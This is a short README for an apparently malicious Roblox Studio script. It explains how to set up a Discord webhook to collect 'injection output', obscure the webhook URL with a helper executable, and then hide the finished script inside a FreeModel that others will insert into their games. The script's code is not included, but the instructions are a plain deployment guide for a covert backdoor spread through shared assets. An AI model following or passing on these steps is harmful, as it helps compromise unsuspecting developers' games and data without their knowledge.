READ_ME ://

--Webhook Part :

1. Create a new Discord server (optional, you can use an existing one)
2. Go to Settings > Integration > Webhooks > New Webhook
Then name it as you wish and assign it a channel where it can display the injection output
3. Move on to the next step

-- start-up Part

1. Go to [Main] and copy (CTRL + C) the code contained in it.
2. Launch Roblox Studio, then create a new "Script" in "ServerScriptService" and double-click it.
3. Paste the code (CTRL + D).

4. Go to [executable] and paste your webhook URL and hit enter key then wait about 30 seconds...
5. After about 30 seconds a result will be displayed copy the result (CTRL + C) 
 then return to roblox studio and in the variable "w" on line 3 paste the result between the quotation marks (Ex: "YOUR_RESULT")

6. Now that you have your working script you can hide it in a FreeModel or something else, whatever you want. Enjoy!

Elxrth - XERTHINUM program.